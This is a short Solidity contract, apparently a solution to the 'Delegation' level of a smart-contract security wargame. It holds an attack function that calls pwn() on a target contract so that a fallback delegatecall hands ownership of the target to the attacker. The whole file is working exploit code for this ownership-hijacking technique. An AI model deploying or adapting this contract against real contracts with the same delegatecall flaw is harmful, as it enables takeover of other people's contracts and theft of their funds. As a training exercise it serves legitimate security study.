// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "./Delegation.sol";

contract DelegationAttack {

  Delegation public victimContract;

  constructor(address _victimContract) {
    victimContract = Delegation(_victimContract);
  }

  function attack() public returns (bool) {
    (bool result,) = address(victimContract).call(abi.encodeWithSignature("pwn()"));
    return result;
  }
}